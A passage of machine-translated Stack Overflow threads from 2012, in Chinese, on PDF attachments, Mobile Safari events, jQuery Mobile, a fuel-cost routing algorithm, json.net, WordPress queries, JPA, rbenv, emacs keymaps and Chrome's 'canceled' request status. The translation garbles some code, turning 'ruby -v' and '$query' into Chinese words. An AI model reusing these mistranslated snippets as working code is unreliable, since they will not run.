  foreach (PdfName key in refs.Keys) {
    PRStream stream = (PRStream) PdfReader.GetPdfObject(
      refs.GetAsIndirectObject(key)
    );

    using (FileStream fs = new FileStream(
      filespec.GetAsString(key).ToString(), FileMode.OpenOrCreate
    )){
      byte[] attachment = PdfReader.GetStreamBytes(stream);
      fs.Write(attachment, 0, attachment.Length);
    }
  }
} 
```

如果您想对此进行测试，请将您引用的*Kubrick 集合示例*中的输出文件传递给`PdfReader`构造函数 ( )。`readerPath`

*   Java版本：[part4.chapter16.KubrickDocumentary](http://itextpdf.com/examples/iia.php?id=290)
*   [C# 版本](http://kuujinbo.info/iTextInAction2Ed/index.aspx?ch=Chapter16&ex=KubrickDocumentary)。

希望本月我有时间从版本 5.2.0.0 更新 C# 示例（iTextSharp 版本现在比 Java 版本晚大约三周）。

# javascript - 在 Mobile Safari 中通过 JavaScript 检测关闭浏览器选项卡？

> ID：12009392
> 
> 赞同：5
> 
> 时间：2012-08-17T16:16:38.663
> 
> 标签：javascript, ios, ipad, safari

当用户单击当前浏览器选项卡的关闭按钮时，我需要获取任何事件。我在这种情况下使用的任何一种方法都不起作用（例如 onunload、unload 和 pagehide 事件处理不检测关闭选项卡，仅更改或更新选项卡）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-05-26T01:38:38.507

从[Safari 文档](https://developer.apple.com/library/mac/documentation/AppleApplications/Reference/SafariWebContent/HandlingEvents/HandlingEvents.html#//apple_ref/doc/uid/TP40006511-SW5)：

> 卸载已弃用，请改用 pagehide。

当您单击“选项卡”视图以打开新页面时，看起来 pagehide 实际上会触发（请参阅ghenne 的答案中的[此处](https://stackoverflow.com/questions/4401764/what-event-fires-when-a-webkit-webapp-is-terminated)），但除此之外，甚至不存在关闭 Mobile Safari 上的浏览​​器的事件！[在这里](https://stackoverflow.com/questions/5554479/js-event-to-see-if-mobile-safari-has-been-closed)和[这里](https://stackoverflow.com/questions/4940657/handling-standby-on-ipad-using-javascript/4941098#4941098)也找到了信息。

# php - jquery mobile header跨页面重复

> ID：12009398
> 
> 赞同：2
> 
> 时间：2012-08-17T16:16:52.283
> 
> 标签：php, jquery, mobile, jquery-mobile, footer

我正在根据提供的模板设置一个多页 jquery 移动页面：http: [//jquerymobile.com/demos/1.1.1/docs/pages/multipage-template.html](http://jquerymobile.com/demos/1.1.1/docs/pages/multipage-template.html)

如何让页眉/页脚在所有页面上重复而不在页面内容中复制它。

是否有一个 jquery 脚本或者我必须使用某种 php 包含文件？

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T17:55:37.040

您可以使用 JS (jQuery) 来制作模板，并在创建时将其附加到每个`data-role="page"`元素。

```
//create template, notice the "{TITLE}" place-holder for dynamically adding titles
var myHeaderHTML = '<div data-role="header" data-id="my-header" data-position="fixed"><h1>{TITLE}</h1></div>';

//create delegated event handler for the "pagecreate" event for all pseudo-pages
$(document).on('pagecreate', '[data-role="page"]', function () {

    //get the title of this page, if none is given then use a generic title
    var title = $(this).data('title') || 'Some Generic Title';

    //add the header to this pseudo-page
    $(this).append(myHeaderHTML.replace('{TITLE}', title));
});​ 
```

这是一个演示：http: [//jsfiddle.net/vmMVj/](http://jsfiddle.net/vmMVj/)

这将在每个页面被创建时附加一个固定的标题。我通过向元素添加`data-title="Some Title"`属性来添加对传递唯一标题的支持。`data-role="page"`

请注意，我选择`pagecreate`事件是因为它在伪页面即将初始化时发生。如果您要绑定到该`pageinit`事件，那么您将为时已晚，并且必须手动初始化标题小部件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T16:21:51.677

据我所知，您必须在每个`data-role="page"`容器中包含页眉和页脚。如果您不想避免为每个页面输入此内容，那么我会`require_once()`在 PHP 中创建一个包含页眉或页脚的页面，并使用它来代替每次都写出页眉和页脚。

**样本：**

```
<section data-role="page">
<?php require_once("header.php"); ?>

<div data-role="content">
<p>Hello world!</p>
</div>

<?php require_once("footer.php");?>
</section> 
```

**header.php：**

```
<header data-role="header">
<h1>Title</h1>
</header> 
```

**页脚.php：**

```
<footer data-role="footer">
<<p>Footer content here</p>
</footer> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-28T15:44:36.563

为什么更多的 JS ？...而不是为页眉和页脚添加两个元素（“页眉”和“页脚”标签，或具有适当类的 div，但必须使用“位置：固定；”） - 并在页面 div 的顶部和底部添加填充? ...不需要JS代码...这将提高性能...虽然很少:) ...

# algorithm - 建议一个算法（图 - 可能是 NP-Complete）

> ID：12009406
> 
> 赞同：11
> 
> 时间：2012-08-17T16:17:14.607
> 
> 标签：algorithm, networking, graph, minimum, np-complete

有一个城镇网络，由各种整数长度的道路连接。

一位旅行者希望开车从一个城镇到另一个城镇。但是，他不想最小化行驶的距离；相反，他希望尽量减少旅途中的汽油费用。汽油可以在任何城市购买，但是每个城市以不同的（整数）价格供应汽油（因此为什么最短的路线不一定是最便宜的）。1 个单位的汽油使他能够行驶 1 个单位的距离。他的车只能在油箱里装这么多汽油，他可以选择在他所经过的每个城市购买多少单位的汽油。找出最低的汽油成本。

有谁知道可以用来解决这个问题的有效算法？即使是这类问题的名称也会很有用，这样我就可以自己研究了！显然，它与最短路径问题并不完全相同。任何其他提示表示赞赏！

编辑-我遇到的实际问题表明将有<1000个城市；<10000 条道路；油箱容量将在 1 到 100 之间。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T18:01:21.150

如果您愿意增加图形的大小，您可以直接使用[Djikstra 的算法来解决这个问题。](http://en.wikipedia.org/wiki/Dijkstra%27s_algorithm)

假设您的油箱可以容纳 0 到 9 个单位的汽油。

这个想法是将每个城镇分成 10 个节点，城镇 t 的节点 x 表示在城镇 t，油箱中有 x 个单位的汽油。

然后，您可以在此扩展图上构建零成本边以表示不同城镇之间的旅行（在此过程中用尽汽油，因此如果距离为 3，您将从 8 级节点转到 5 级节点），并且更多边到表示在每个城镇用一单位汽油加满油箱（费用取决于城镇）。

然后应用 Djikstra 应该给出从开始到结束的最低成本路径。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:33:25.987

我认为问题是：汽油是否有可能使潜在的旅行商问题在计算上更可行？如果不是，则没有有效的非逼近算法。

当然，你可以为边缘情况找到有效的解决方案，并且在汽油条件下可能会有更多的边缘情况，例如，总是先考虑这个城市，因为汽油很便宜。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:36:53.983

我认为您可以通过动态编程来解决这个问题。对于每个节点，您保存一组汽油成本元组和使用该汽油的路径长度，其中包含最佳解决方案。您循环遍历所有节点的每一步，如果有一个节点可以去，并且已经有解决方案，那么您循环遍历所有节点，您可以使用解决方案去。您选择最低成本，但请注意：您必须考虑当前节点中的汽油成本。阵列中所有高于当前节点成本的成本，都可以在当前节点购买。请注意，应该重新计算已经有解决方案的节点，因为您可以从那里去的节点可能会改变。您从结束节点开始，将解决方案设置为一个空数组（或一个成本和长度为 0 的条目）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T23:17:09.447

这可以使用遗传算法进行适当优化。遗传算法在一些复杂问题上击败了人类： [http ://en.wikipedia.org/wiki/Genetic_algorithm](http://en.wikipedia.org/wiki/Genetic_algorithm)

遗传算法的要点是：

1.  提出候选解决方案的排名功能
2.  想出一组独特的候选解决方案。用一些随机生成的可能性对其进行初始化。也许是 10 或 100 或 1000...
3.  从池中复制一个候选解决方案并以某种方式对其进行扰动 - 添加一个城镇、删除一个城镇、添加两个城镇等。这可能会改善或恶化问题 - 您的排名功能将帮助您判断。你选哪一个？通常，您会选择最好的，但有时，您会故意选择一个，以免陷入局部最优。
4.  新解决方案是否已经排名？如果是，请将其丢弃并转到
    1.  如果没有，请继续...
5.  将受干扰的候选人添加回其新计算的排名下的池中
6.  继续这个（从#3重复），直到你觉得你已经完成了足够长的时间
7.  最后，选择排名最高的答案。它可能不是最佳的，但它应该非常好。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-17T16:59:13.307

我会试试这个：

1.  找到从起点到终点的最短路线。Dijkstra 的算法适用于此。
2.  找出这条路线行驶的最低汽油成本。我不知道有任何现成的算法可以解决这个问题，但除非沿途有许多城市，否则即使是详尽的搜索也不应该在计算上不可行。
3.  寻找下一条最短的路线...

定义精确的停止标准是一个挑战，最好是在新测试路线的最低成本大于已测试路线的最低成本时停止。

因此，使用 2 种算法，一种用于问题的每个部分。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-20T16:06:10.383

您也可以将其表述为整数线性规划 (ILP) 问题。优点是有许多现成的求解器可用于此任务，并且复杂性不会像具有罐大小的彼得斯解决方案那样快速增长。

在这个特定问题中的变量将是在任何一个城镇购买的汽油量、沿途任何城镇的汽车油箱量以及实际使用的道路。约束条件必须保证汽车在每条道路上消耗必要的燃料，并且在任何城镇的燃料不小于 0 或超过 MAX 个单位，并且道路构成从 A 到 B 的路径。目标是购买燃料的总成本。

整个事情可能看起来很可怕（ILP 公式经常这样做），但这并不意味着它不能在合理的时间内解决。

# iphone - UISearchDisplayController searchResultsTableView 不在 iPad 的弹出窗口中？

> ID：12009409
> 
> 赞同：0
> 
> 时间：2012-08-17T16:17:23.847
> 
> 标签：iphone

在 Apple 的 TableSearch 示例代码中，在 iPad 上，当他们在 searchBar 中搜索时，tableView 会更新以反映正在搜索的内容。在 iPad 上，我的 SearchDisplayController 将 tableView 放在 UIPopoverController 中。有什么办法可以避免这种行为并更新占据我整个屏幕的原始 tableView 中的列表？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T19:55:20.670

所以我可以通过不使用搜索显示控制器而只使用搜索栏的委托方法来获得所需的功能：

```
- (void)searchBar:(UISearchBar *)searchBar textDidChange:(NSString *)searchText {

     // filter content and reload table.
} 
```

# php - 将总数分成 5 个不同的数字

> ID：12009410
> 
> 赞同：1
> 
> 时间：2012-08-17T16:17:25.357
> 
> 标签：php, mysql

好的，我想要做的是将一个数字（`$row['count']`）分成 5，如果你想要相等的数字，这很容易：

```
$sum  = ($row['count'] / 5);
$fsum = floor($sum); 
```

**但是**我希望每个数字都不同，并且仍然加起来就是总数，即`$row['count']`如何实现？

**更新：**

如果这有助于它用于更新数据库中的 5 行：

```
$query  = "SELECT * FROM foo";
$result = mysql_query($query);

while ($row = mysql_fetch_array($result)) {

    $sum  = ($row['count'] / 5);
    $fsum = floor($sum);
    $id   = $row['id'];

    $update = "UPDATE foo SET foo1='$fsum', foo2='$fsum', foo3='$fsum', foo4='$fsum', foo5='$fsum' WHERE id='$id'";

    mysql_query($update);

    }// while 
```

所以理想情况下，`$update`查询应该是这样的：

```
$update = "UPDATE foo SET foo1='$fsum1', foo2='$fsum2', foo3='$fsum3', foo4='$fsum4', foo5='$fsum5' WHERE id='$id'"; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:03:50.500

这是我的看法：

```
function randomize($sum, $parts) {
    $part_no = count($parts);
    $continnue_counter = 0;

    while (count(array_unique($parts)) != $part_no) {
        $changing = array_rand($parts, 2);
        if (($parts[$changing[0]] - 1) == 0 || ($parts[$changing[1]] - 1) == 0) { // don't let them go under 1
            ++$continnue_counter;

            // sometime one element get everything and others even out on 1
            // just throw away everything you got so far and start over
            if ($continnue_counter > 10) {
                $parts = setup($sum, $part_no);
                $continnue_counter = 0;
            }
            continue;
        }
        $continnue_counter = 0;

        $signum   = mt_rand(0, 100) % 2 ? 1 : -1;
        $delta    = $signum * mt_rand(1, min($parts[$changing[0]] - 1, $parts[$changing[1]] - 1)); // -1 to make sure they don't go under 0
        $parts[$changing[0]] += $delta;
        $parts[$changing[1]] -= $delta;
    }
    return $parts;
}

function setup($sum, $part_no) {
    $parts = array_fill(0, $part_no, (int)($sum / $part_no));

    // acount for the reminder of (int) cast
    $reminder = $sum - array_sum($parts);
    while ($reminder) {
        $parts[array_rand($parts)] += 1;
        --$reminder;
    }

    return $parts;
}

$part_no = 5;
$sum = 42;

$parts = randomize($sum, setup($sum, $part_no));

var_export($parts);
print array_sum($parts) 
```

### 更新：

我添加了一个引入更多熵的版本。

### 更新2：

更随机的人倾向于将除一部分之外的所有内容都减少到 1，添加了一个明确的检测来处理这个问题。其背后的算法仍然具有未知的终止时间。

# c# - 使用 json.net 反序列化数组

> ID：12009414
> 
> 赞同：0
> 
> 时间：2012-08-17T16:17:39.787
> 
> 标签：c#, json.net, windows-phone

我需要反序列化一个 json 数组：

```
{"response":
[19,
    {"mid":1068,
     "date":1343848664,
     "out":1,
     "uid":44852633,
     "read_state":1,
     "title":" ... ",
     "body":"А я вовсю."},
    {"mid":1007,
     "date":1328782448,
     "out":1,
     "uid":16098752,
     "read_state":0,
     "title":" ... ",
     "body":"http:\/\/theantidj.net\/wp-content\/themes\/theantidjnet\/images\/khubvio.php"} 
```

等等。我正在使用 json.net。我可以使用 JsonConvert.DeserializeObject() 执行反序列化吗？如果是这样，我应该创建哪些类？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:34:48.353

只是另一种解决方案。

```
var itemList = ((JObject)JsonConvert.DeserializeObject(json))["response"]
                .Skip(1)
                .Select(x => JsonConvert.DeserializeObject<Item>(x.ToString()))
                .ToList();

public class Item
{
    public int mid { set; get; }
    public string date { set; get; }
    public int @out { set; get; }
    public int  uid { set; get; }
    public int read_state { set; get; }
    public string title { set; get; }
    public string body { set; get; }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:01:52.063

LB 提供了解决方案。但我会注意到，如果我的记忆对我有用，**JObject**用于*动态*类型。因此它需要**.Net 4**或更高版本。以防万一。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-17T16:22:37.927

`JsonConvert.DeserializeObject<RootObject>(jsonstring)`定义 this 后即可使用`RootObject`。

我使用的工具是[http://json2csharp.com](http://json2csharp.com)，您只需在其中放入 JSON 并取出相应的对象。不过，您需要确保您的 JSON 格式正确，因为在其当前形式下，它不会被解析。

# ios - 在 Safari/Mail 等中模拟 iOS 缩放工具

> ID：12009416
> 
> 赞同：1
> 
> 时间：2012-08-17T16:17:45.997
> 
> 标签：ios, uiscrollview, zooming, slide

我有一个全屏 UIView，它是用户与之交互的应用程序的主视图。允许用户在视图上滑动手指，我需要缩放用户手指周围的区域。与大多数 iOS 应用程序中的文本输入字段有些类似的效果，如果您点击、按住并滑动手指，手指周围的文本会缩放。

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:25:14.207

有一个开源控件可以做到这一点：[https ://github.com/acoomans/iOS-MagnifyingGlass](https://github.com/acoomans/iOS-MagnifyingGlass)

# php - 在这种特殊情况下，如何从二维数组中检索数据？

> ID：12009417
> 
> 赞同：2
> 
> 时间：2012-08-17T16:17:45.743
> 
> 标签：php

我有一个带有这个 var_dump 值的数组：

```
$query = $wpdb->get_results("SELECT COUNT(*) FROM `$table` WHERE my mysql conditions"); 
```

**var_dump($查询); 这是：**

```
array(1) { [0]=> object(stdClass)#414 (1) { ["COUNT(*)"]=> string(3) "494" } } 
```

如何在变量中获取数字 494？

$number = $查询[0];

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:21:44.673

如果您将计数别名为这样，它会更干净：

```
SELECT COUNT(*) AS `count` 
```

然后

```
$number = $query[0]->count; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:23:02.547

如果您只需要检索单个值，请使用[`$wpdb->get_var()`](http://codex.wordpress.org/Class_Reference/wpdb#SELECT_a_Variable)而不是`get_results()`. 这种方法专门针对像您这样的情况。

```
$number = $wpdb->get_var("SELECT COUNT(*) FROM `$table` WHERE my mysql conditions"); 
```

# java - JPA 和 SYS_REFCURSOR 类似 OUT 参数

> ID：12009418
> 
> 赞同：1
> 
> 时间：2012-08-17T16:17:48.947
> 
> 标签：java, plsql, eclipselink, sys-refcursor, glassfish-4

我想使用带有`SYS_REFCURSOR`类似`OUT`参数的 JPA 调用一个过程。使用普通 JDBC 这很容易，但我不确定这在 JPA 中是否可行。

我的程序如下：

```
CREATE OR REPLACE FUNCTION FN_GET_COINS
  RETURN SYS_REFCURSOR
IS vCursor SYS_REFCURSOR;

BEGIN
  OPEN vCursor FOR
    SELECT
      ...
  RETURN vCursor;
  CLOSE vCursor;

EXCEPTION
  ...
END FN_GET_COINS; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-07-17T01:48:42.100

**JPA 2.0**不支持存储过程，但在**JPA 2.1**中添加了支持，它是**Java EE 7**的一部分。使用 Oracle SYS_REF_CURSOR 的标准 JPA 2.1 代码示例：

[http://wiki.eclipse.org/EclipseLink/Release/2.5/JPA21#Ref_cursor_Example](http://wiki.eclipse.org/EclipseLink/Release/2.5/JPA21#Ref_cursor_Example)
[http://en.wikibooks.org/wiki/Java_Persistence/Advanced_Topics#JPA_2.1_StoredProcedureQuery](http://en.wikibooks.org/wiki/Java_Persistence/Advanced_Topics#JPA_2.1_StoredProcedureQuery)

* * *

*   EclipseLink 2.5 支持 JPA 2.1（它是参考实现）：

    [http://www.eclipse.org/eclipselink/releases/2.5.php](http://www.eclipse.org/eclipselink/releases/2.5.php)
    [https://glassfish.java.net/](https://glassfish.java.net/)

*   Hibernate 4.3.11 支持 JPA 2.1：

    [http://www.hibernate.org/downloads](http://www.hibernate.org/downloads)

*   Hibernate 4.2 支持通过本机 API 和配置（非 JPA）的存储过程：

    [http://docs.jboss.org/hibernate/orm/3.3/reference/en/html/querysql.html#sp_query](http://docs.jboss.org/hibernate/orm/3.3/reference/en/html/querysql.html#sp_query)

    （这里的 CURSOR 必须通过“存储函数”返回，或者必须是存储过程的第一个参数（out））。

    此外，Polpan[在此处](https://stackoverflow.com/questions/14335939/how-to-call-oracle-function-or-procedure-using-hibernate-4-entitymanager)的回答显示了如何使用带有 QueryHint 的 JPA 2.0 本机查询来完成此操作，将 Hibernate 专有提示属性设置`org.hibernate.callable`为 true。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:58:42.250

如果你想用标准化的 JPA 2.0 来做，那么你就不走运了（除了通过“本机查询”API 来破解它......它在 JPA2.1 中是标准化的。

DataNucleus JPA 自 2012 年初以来一直支持 JPA 2.1 语法（如原始答案中所述，因此不知道“当前答案已过时”应该是什么意思），如这些文档 [http://www.datanucleus 所示。 org/products/accessplatform_3_3/jpa/stored_procedures.html](http://www.datanucleus.org/products/accessplatform_3_3/jpa/stored_procedures.html)

# ruby - 无法在 OSX Mountain Lion 上安装 ruby 1.9.3

> ID：12009419
> 
> 赞同：0
> 
> 时间：2012-08-17T16:17:49.900
> 
> 标签：ruby, macos, osx-mountain-lion, octopress

我安装了 home brew 和 rbenv。我已按照以下说明进行操作：

[http://octopress.org/docs/setup/rbenv/](http://octopress.org/docs/setup/rbenv/)

一切似乎都完美无缺，但是当我打字时

> 红宝石-v

它仍然说 1.8.7 ...

不知道我做错了什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:39:44.610

Unix 将运行它在搜索路径中首先找到的 Ruby 副本。在终端中键入以下命令：

```
echo $PATH
which ruby 
```

第一个将显示 Unix 查找`ruby`命令的顺序。第二个会告诉你`ruby`它发现了什么。您可能需要编辑`PATH=`.bash_profile 或 .bashrc 中的命令以更改搜索路径的顺序，例如：

```
PATH=/usr/local/bin:/usr/local/sbin:$PATH 
```

将 /usr/local/bin 和 /usr/local/sbin 添加到您现有的 PATH 中，以告诉 Unix 在 /usr/bin 之前搜索您的 /usr/local/bin 目录

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:00:47.177

在过去的几年里，我多次尝试过[MacPorts](http://www.macports.org)和[Homebrew 。](https://github.com/mxcl/homebrew/)当谈到 ruby​​ 时，没有其他系统可以与[RVM](https://rvm.io/)匹敌。

网上有很多指南。谷歌，挑一个就走。

注意：*Octopress 博客系统，附带一个 rvm-ready 包，它将安装和使用 ruby​​-1.9.2x，上次我检查 :-)*

# emacs - emacs：将数字行的绑定切换到 -ed 等价物

> ID：12009422
> 
> 赞同：3
> 
> 时间：2012-08-17T16:18:08.897
> 
> 标签：emacs, lisp, bind, key-bindings, viper-mode

在 emacs 中，我想重新绑定键盘的第一行，`[1...0]`以便按下未修改的键会导致其移位等效项。也就是说，打字`1234567890`会导致`!"£$%^&*()`被插入缓冲区。

我在 Windows Vista 中使用 emacs 24.1.1，并启用了 viper 模式。我正在使用 slime 进行一些 Common Lisp 编程。我使用 viper 是为了避免过于频繁地使用 Ctrl 和 Shift，因为我可以获得一些 emacs 小指（RSI）。开始使用 lisp 编程后，我发现点击`S-9`和`S-0`打开和关闭括号开始产生影响。

通过在我的启动文件中包含以下内容，我可以绑定`9`到`(`，反之亦然。

```
(defvar my-keymap
    (let ((map (make-sparse-keymap)))
    (define-key map (kbd "9") '(lambda () (interactive) (insert "(")))
    (define-key map (kbd "(") '(lambda () (interactive) (insert "9")))
    map))

(viper-modify-major-mode
    'lisp-mode
    'insert-state
    my-key-map) 
```

这工作得很好，很容易扩展到行的其余部分，除了我希望能够在两种模式之间切换而不必按住 shift（例如，通过切换 Caps Lock）。

有什么办法可以做到这一点，还是我完全错了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T18:03:43.887

下面是我快速编写的一个示例，在 Linux 上的 Emacs24 中对其进行了测试：

```
(setq viper-mode-key-mapping "custom")

(defvar custom-viper-keymap
    (let ((map (make-sparse-keymap)))
      (define-key map (kbd "9") '(lambda () (interactive) (insert "(")))
      (define-key map (kbd "(") '(lambda () (interactive) (insert "9")))
      map))

(defvar default-viper-keymap
    (let ((map (make-sparse-keymap)))
      (define-key map (kbd "9") '(lambda () (interactive) (insert "9")))
      (define-key map (kbd "(") '(lambda () (interactive) (insert "(")))
      map))

(defun switch-viper-mode-custom-keymap () 
  (interactive) 
  (if (string= viper-mode-key-mapping "default")
      (progn (setq viper-mode-key-mapping "custom")
         (viper-modify-major-mode 'lisp-mode 'insert-state custom-viper-keymap))
    (progn (setq viper-mode-key-mapping "default")
       (viper-modify-major-mode 'lisp-mode 'insert-state default-viper-keymap))))

(global-set-key [(control f1)] 'switch-viper-mode-custom-keymap) 
```

当我激活 viper 模式时，按 CTRL-F1 将键盘映射从自定义切换到正常。

# debugging - 在 Chrome 开发者工具中，资源的 status=canceled 是什么意思？

> ID：12009423
> 
> 赞同：460
> 
> 时间：2012-08-17T16:18:09.243
> 
> 标签：debugging, http, google-chrome, developer-tools, web-developer-toolbar

什么会导致页面被取消？我有 Chrome 开发者工具的截图。

![取消的资源](../Images/2da8b1ce9546febb9e5ac6d2f20a9ef8.png)

这种情况经常发生，但不是每次都发生。似乎一旦缓存了其他一些资源，页面刷新就会加载 LeftPane.aspx。真正奇怪的是，这只发生在 Google Chrome 中，而不是 Internet Explorer 8。任何想法为什么 Chrome 会取消请求？

* * *

## 回答 #1

> 赞同：683
> 
> 时间：2012-11-19T17:34:50.890

我们解决了一个类似的问题，Chrome 取消了在框架或 iframe 中加载内容的请求，但只是间歇性的，而且它似乎取决于计算机和/或互联网连接的速度。

这些信息已经过时了几个月，但我从头开始构建 Chromium，挖掘源代码以找到所有可以取消请求的地方，并在所有这些地方设置断点以进行调试。从内存中，Chrome 会取消请求的唯一地方：

*   导致发出请求的 DOM 元素被删除（即正在加载 IMG，但在加载发生之前，您删除了 IMG 节点）
*   你做了一些不必要的加载数据的事情。（即您开始加载 iframe，然后更改 src 或覆盖内容）
*   有很多请求发往同一台服务器，早期请求的网络问题表明后续请求无法正常工作（DNS 查找错误，早期（相同）请求导致例如 HTTP 400 错误代码等）

在我们的例子中，我们最终将其追溯到一个试图将 HTML 附加到另一个帧的帧，这有时甚至发生在目标帧加载之前。一旦你触摸了 iframe 的内容，它就不能再将资源加载到其中（它怎么知道把它放在哪里？）所以它取消了请求。

* * *

## 回答 #2

> 赞同：67
> 
> 时间：2014-06-05T13:55:42.277

status=canceled 也可能发生在 JavaScript 事件的 ajax 请求上：

```
<script>
  $("#call_ajax").on("click", function(event){
     $.ajax({
        ...    
     });
  });
</script>

<button id="call_ajax">call</button> 
```

该事件成功发送请求，但随后被取消（但由服务器处理）。原因是，元素在点击事件上提交表单，无论您是否在同一个点击事件上发出任何 ajax 请求。

为了防止请求被取消，`event.preventDefault();`必须调用 JavaScript：

```
<script>
  $("#call_ajax").on("click", function(event){
     event.preventDefault();
     $.ajax({
        ...    
     });
  });
</script> 
```

* * *

## 回答 #3

> 赞同：39
> 
> 时间：2016-09-22T13:00:15.933

注意：确保您没有**任何包装表单元素**。

我有一个类似的问题，我的带有 onclick={} 的按钮被包装在一个表单元素中。单击按钮时，表单也被提交，这一切都搞砸了......

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2013-10-16T10:53:38.390

另一件需要注意的事情可能是 AdBlock 扩展，或一般的扩展。

但是“很多”人都有 AdBlock....

要排除扩展程序，请在隐身模式下打开一个新选项卡，确保您要测试的扩展名的“允许隐身模式已关闭”。

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2013-07-04T04:32:22.637

就我而言，我发现是jquery全局超时设置，一个jquery插件设置全局超时为500ms，这样当请求超过500ms时，chrome就会取消请求。

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2013-06-12T21:19:12.370

您可能需要检查“X-Frame-Options”标头标签。[如果将其设置为 SAMEORIGIN 或 DENY，则 Chrome（和其他浏览器）将根据规范](https://developer.mozilla.org/en-US/docs/HTTP/X-Frame-Options)取消 iFrame 插入。

另请注意，某些浏览器支持 ALLOW-FROM 设置，但 Chrome 不支持。

要解决此问题，您需要删除“X-Frame-Options”标头标签。这可能会让您对[点击劫持攻击持](http://en.wikipedia.org/wiki/Clickjacking)开放态度，因此您需要确定风险是什么以及如何减轻风险。

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2013-06-25T20:01:57.713

这是发生在我身上的事情：服务器为 302 重定向返回了格式错误的“位置”标头。当然，Chrome 没有告诉我这一点。我用firefox打开页面，马上就发现了问题。很高兴拥有多种工具:)

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2017-06-20T18:39:12.980

我们遇到`(canceled)`状态的另一个地方是特定的 TLS 证书配置错误。如果诸如此类的站点`https://www.example.com`配置错误，以至于证书不包含 ，`www.`但对 有效`https://example.com`，则 chrome 将取消此请求并自动重定向到后一个站点。Firefox并非*如此*。

当前有效示例：[https ://www.pthree.org/](https://www.pthree.org/)

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2013-10-21T13:12:12.877

在 iframe 中不同域上的安全和非安全页面之间重定向时，我发生了取消的请求。重定向的请求在开发工具中显示为“已取消”请求。

我有一个带有 iframe 的页面，其中包含由我的支付网关托管的表单。提交 iframe 中的表单后，支付网关将重定向回我服务器上的 URL。重定向最近停止工作并最终成为“已取消”的请求。

似乎 Chrome（我使用的是 Windows 7 Chrome 30.0.1599.101）不再允许 iframe 中的重定向转到单独域上的非安全页面。为了解决这个问题，我只是确保 iframe 中的所有重定向请求始终发送到安全 URL。

当我创建一个只有 iframe 的更简单的测试页面时，控制台中有一个警告（我之前错过了或者可能没有出现）：

```
[Blocked] The page at https://mydomain.com/Payment/EnterDetails ran insecure content from http://mydomain.com/Payment/Success 
```

在 PC、Mac 和 Android 上的 Chrome 中，重定向变成了取消的请求。我不知道它是特定于我的网站设置（SagePay Low Profile）还是 Chrome 中的某些内容发生了变化。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2014-03-26T21:30:16.850

如果我使用指向本地主机的[移动仿真，Chrome 版本 33.0.1750.154 m 会始终取消图像加载；](https://developers.google.com/chrome-developer-tools/docs/mobile-emulation)特别是使用**用户代理欺骗*（***与仅屏幕设置相比）。

当我关闭用户代理欺骗时；图像请求没有被取消，我看到了图像。

我还是不明白为什么；在前一种情况下，请求被取消的请求标头（注意：显示临时标头）只有

*   接受
*   缓存控制
*   编译指示
*   推荐人
*   用户代理

在后一种情况下，所有这些加上其他人喜欢：

*   曲奇饼
*   联系
*   主持人
*   接受编码
*   接受语言

*耸耸肩*

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2017-04-08T21:40:02.997

当我通过 JavaScript 重定向时，我在 Chrome 中收到此错误：

```
<script>
    window.location.href = "devhost:88/somepage";
</script> 
```

如您所见**，我忘记了 'http://'**。我添加后，它起作用了。

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2017-04-24T12:16:46.680

就我而言，我有一个带有点击事件的锚点，例如

```
<a href="" onclick="somemethod($index, hour, $event)"> 
```

在点击事件中，我有一些网络调用，Chrome 取消了请求。锚点有`href`手段`""`，它重新加载页面，同时它有点击事件，网络调用被取消。每当我`href`用 void替换

```
<a href="javascript:void(0)" onclick="somemethod($index, hour, $event)"> 
```

问题消失了！

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2019-12-16T10:41:13.717

如果你使用 axios 它可以帮助你

`// change timeout delay: instance.defaults.timeout = 2500;`

[https://github.com/axios/axios#config-order-of-precedence](https://github.com/axios/axios#config-order-of-precedence)

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2018-12-26T06:17:54.333

这是我刚刚遇到的另一种请求被chrome取消的情况，上面的任何答案都没有涵盖。

简而言之
，自签名证书在我的 Android 手机上不受信任。

详细信息
我们处于开发/调试阶段。该 url 指向一个自签名主机。代码如下：

```
location.href = 'https://some.host.com/some/path' 
```

Chrome 只是默默地取消了请求，没有给像我这样的 web 开发新手解决问题留下任何线索。一旦我使用安卓手机下载并安装了证书，问题就消失了。

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2018-05-31T11:02:04.760

